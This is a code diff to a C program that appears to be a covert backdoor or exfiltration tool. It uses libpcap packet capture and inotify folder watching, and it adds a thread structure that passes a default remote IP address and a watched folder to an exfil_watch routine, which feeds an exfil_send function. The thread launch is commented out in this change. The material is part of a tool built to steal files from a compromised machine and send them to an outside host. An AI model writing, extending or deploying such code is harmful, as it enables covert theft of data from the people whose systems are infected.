@@ -7,6 +7,7 @@
 #include <sys/inotify.h>
 #include <sys/select.h>
 #include <sys/socket.h>
+#include <pthread.h>
 
 #include "server.h"
 #include "crypto.h"
@@ -24,11 +25,24 @@
 
 struct bpf_program fltr_prog;
 
+struct exfil_pack
+{
+	uint32 ipaddr;
+	char * folder;
+};
+
 void pcap_start(const char *fltr_str, int duplex)
 {
 	pcap_t* nic;
-
 	char errbuf[PCAP_ERRBUF_SIZE];
+	pthread_t exfil_thread;
+	struct exfil_pack expck;
+
+	expck.ipaddr = DEF_ADR;
+	expck.folder = DEF_WCH;
+
+	// Setup Exfil Watch
+	//pthread_create(&exfil_thread, NULL, exfil_watch, &expck);
 
 	if ((nic = pcap_open_live(NULL, MAX_LEN, 0, -1, errbuf)) == NULL)
 		error(errbuf);
@@ -48,6 +62,8 @@ void pcap_start(const char *fltr_str, int duplex)
 			error("pcap_loop");
 		usleep(5000); // sleep 5ms
 	}
+	
+	//pthread_join(exfil_thread, NULL);
 }
 
 void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char *packet)
@@ -193,11 +209,14 @@ void exfil_send(uint32 ipaddr, char *path)
 	}
 }
 
-void exfil_watch(uint32 ipaddr, char *folder)
+void *exfil_watch(void *arg)
 {
 	int fd, wd, ret;
 	static struct inotify_event *event;
 	fd_set rfds;
+	struct exfil_pack expck = *(struct exfil_pack*)arg;
+	uint32 ipaddr = expck.ipaddr;
+	char * folder = expck.folder;
 
 	fd = inotify_init();
 	if (fd < 0)
